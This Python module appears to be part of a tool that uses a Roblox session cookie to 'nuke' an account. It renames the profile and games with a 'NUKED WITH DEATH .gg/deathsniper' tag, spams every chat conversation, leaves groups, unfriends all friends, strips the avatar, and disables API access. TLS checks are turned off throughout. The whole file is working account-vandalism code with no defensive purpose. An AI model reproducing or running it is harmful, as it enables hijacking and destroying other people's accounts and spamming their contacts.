import aiohttp
import asyncio
from src import csrf, cprint
import traceback

async def start(self):
    try:
        async with aiohttp.ClientSession(cookies={".ROBLOSECURITY": self.cookie}) as session:
            self.display_theme(1)
            choice = cprint.user_input("Are you sure you want to nuke this cookie/account? the account will not be usable anymore (y/N) > ")
            if choice in ["yes", "y"]:
                tasks = [
                    asyncio.create_task(change_name(session, self.id)),
                    asyncio.create_task(change_desc(session)),
                    asyncio.create_task(change_lang(session)),
                    asyncio.create_task(message_all(session)),
                    asyncio.create_task(leave_group(session, self.id)),
                    asyncio.create_task(unfriend(session, self.id)),
                    asyncio.create_task(modify_games(session, self.id)),
                    asyncio.create_task(change_avatar(session))
                ]
                xcsrf = csrf.get(self.cookie)
                session.headers.update({"X-Csrf-Token": xcsrf})
                await asyncio.gather(*tasks)
    except Exception as e:
        traceback.print_exc()


########## CHANGE DISPLAY NAME ##########
async def change_name(session, id):
    async with session.get(f"https://users.roblox.com/v1/users/{id}/display-names/validate?displayName=aaaaa", ssl=False) as response:
        if response.status == 200:
            async with session.patch(f"https://users.roblox.com/v1/users/{id}/display-names", json={"newDisplayName": "NUKEDWITHDEATH"}, ssl=False) as response:
                if response.status == 200:
                    cprint.custom("Changed user display name!", "SUCCESS", (0,255,0))
                    return
        else:
            cprint.error("Account display name change is still on cooldown")


########## CHANGE DESCRIPTION ##########
async def change_desc(session):
    async with session.post("https://users.roblox.com/v1/description", json={"description": "NUKED WITH DEATH .gg/deathsniper"}, ssl=False) as response:
        if response.status == 200:
            cprint.custom("Changed description!", "SUCCESS", (0,255,0))
            return
        else:
            cprint.error(f"Failed to change description: {response.status}")


########## CHANGE LANGUAGE ##########
async def change_lang(session):
    async with session.post("https://locale.roblox.com/v1/locales/set-user-supported-locale", json={"supportedLocaleCode": "ja_jp"}, ssl=False) as response:
        if response.status == 200:
            cprint.custom("Changed user language!", "SUCCESS", (0,255,0))
        else:
            cprint.error(f"Failed to change user language: {response.status}")


########## SPAM MESSAGE ##########
async def message_all(session):
    convs = await get_convs(session)
    if convs is not None and len(convs) >= 1:
        tasks = [asyncio.create_task(send_message(session, conv)) for conv in convs for i in range(5)]
        await asyncio.gather(*tasks)

async def get_convs(session):
    async with session.get("https://chat.roblox.com/v2/get-user-conversations?pageNumber=1&pageSize=3000", ssl=False) as response:
        if response.status == 200:
            data = await response.json()
            cprint.custom("Gathered user conversations!", "SUCCESS", (0,255,0))
            return data
        else:
            cprint.error(f"Failed to gather user conversations: {response.status}")
            return None

async def send_message(session, conv):
    async with session.post("https://chat.roblox.com/v2/send-message", json={"conversationId": conv["id"], "message": "NUKED WITH DEATH"}, ssl=False) as response:
        if response.status == 200:
            data = await response.json()
            cprint.custom(f"Sent a message to {conv['title']}!", "SUCCESS", (0,255,0))
            return data
        else:
            cprint.error(f"Failed to send message: {response.status}")
            return None


########## CHANGE AVATAR ##########
async def change_avatar(session):
    async with session.post("https://avatar.roblox.com/v2/avatar/set-wearing-assets", json={"assets":[]}, ssl=False) as response:
        if response.status == 200:
            cprint.custom(f"Removed all avatar accessories!", "SUCCESS", (0,255,0))
            async with session.post("https://avatar.roblox.com/v1/avatar/set-body-colors", json={"headColorId":1003,"torsoColorId":1004,"rightArmColorId":21,"leftArmColorId":21,"rightLegColorId":26,"leftLegColorId":199}, ssl=False) as response:
                if response.status == 200:
                    cprint.custom(f"Changed avatar body color!", "SUCCESS", (0,255,0))


########## LEAVE GROUP ##########
async def leave_group(session, id):
    groups = await get_groups(session, id)
    tasks = [asyncio.create_task(leave_groups(session, group, id)) for group in groups]
    await asyncio.gather(*tasks)

async def leave_groups(session, group, id):
    group_name = group['group']['name']
    group_id = group['group']['id']
    group_rank = group["role"]['rank']

    if group_rank == 255:
        return

    async with session.delete(f"https://groups.roblox.com/v1/groups/{group_id}/users/{id}", ssl=False) as response:
        if response.status == 200:
            cprint.custom(f"Left group: {group_name}", "SUCCESS", (0, 255, 0))
        else:
            cprint.error(f"Failed to leave group: {group_name} (ID: {group_id}) {response.status}")

async def get_groups(session, id):
    async with session.get(f"https://groups.roblox.com/v2/users/{id}/groups/roles", ssl=False) as response:
        if response.status == 200:
            data = await response.json()
            groups = data.get("data")
            return groups
        else:
            cprint.error("Failed to fetch groups")
            return None
        

########## UNFRIEND ##########
async def unfriend(session, id):
    friends = await get_friends(session, id)
    if friends is not None and len(friends) >= 1:
        tasks = [asyncio.create_task(fast_unfriend(session, friend)) for friend in friends]
        await asyncio.gather(*tasks)

async def get_friends(session, id):
    async with session.get(f"https://friends.roblox.com/v1/users/{id}/friends", ssl=False) as response:
        if response.status == 200:
            data = await response.json()
            friends = data.get("data")
            cprint.custom(f"Gathered {len(friends)} friend", "SUCCESS", (0, 255, 0))
            return friends
        else:
            cprint.error("Failed to fetch friends")
            return None

async def fast_unfriend(session, friend):
    friend_name = friend['name']
    friend_id = friend['id']

    async with session.post(f"https://friends.roblox.com/v1/users/{friend_id}/unfriend", ssl=False) as response:
        if response.status == 200:
            cprint.custom(f"Unfriended {friend_name} ", "SUCCESS", (0, 255, 0))
        else:
            cprint.error(f"Failed to unfriend: {friend_name} (ID: {friend_id}) {response.status}")


########## CHANGE GAME SETTINGS ##########
async def modify_games(session, id):
    games = await get_games(session, id)
    if games:
        tasks = [asyncio.create_task(modify_game(session, game.get("id"))) for game in games]
        await asyncio.gather(*tasks)

async def modify_game(session, id):
    async with session.patch(f"https://develop.roblox.com/v2/universes/{id}/configuration", json={"name":"NUKED WITH DEATH .gg/deathsniper","description":"NUKED WITH DEATH .gg/deathsniper","studioAccessToApisAllowed":False}, ssl=False) as response:
        if response.status == 200:
            cprint.custom(f"Modified game name and description", "SUCCESS", (0, 255, 0))
        else:
            cprint.error(f"Failed to modify game settings: {response.text}")

async def get_games(session, id):
    async with session.get(f"https://games.roblox.com/v2/users/{id}/games?limit=50&sortOrder=Asc", ssl=False) as response:
        if response.status == 200:
            data = await response.json()
            games = data.get("data")
            cprint.custom(f"Gathered {len(games)}", "SUCCESS", (0, 255, 0))
            return games
        else:
            cprint.error("Failed to fetch games")
            return None
